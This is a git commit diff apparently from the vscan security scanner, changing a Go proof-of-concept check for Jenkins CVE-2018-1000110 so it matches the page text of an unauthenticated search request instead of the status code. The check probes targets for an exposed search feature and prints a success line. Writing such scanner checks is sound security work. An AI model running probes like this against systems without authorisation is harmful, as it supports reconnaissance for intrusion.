d5890e275d1c33efc4b68203ff8a08431226f0d7
veo <38176360+veo@users.noreply.github.com>
2021-08-08 19:27:25 +0800

    更新jenkins poc

--- poc/jenkins/CVE_2018_1000110.go
+++ poc/jenkins/CVE_2018_1000110.go
@@ -3,13 +3,14 @@ package jenkins
 import (
 	"fmt"
 	"github.com/veo/vscan/pkg"
+	"strings"
 )
 
 func CVE_2018_1000110(u string) bool {
 	if req, err := pkg.HttpRequset(u, "GET", "", false, nil); err == nil {
 		if req.Header.Get("X-Jenkins-Session") != "" {
 			if req2, err := pkg.HttpRequset(u+"/search/?q=a", "GET", "", false, nil); err == nil {
-				if req2.StatusCode == 200 {
+				if strings.Contains(req2.Body, "Search for 'a'") {
 					fmt.Printf("jenkins-exp-sucess|CVE_2018_1000110|%s\n", u)
 					return true
 				}
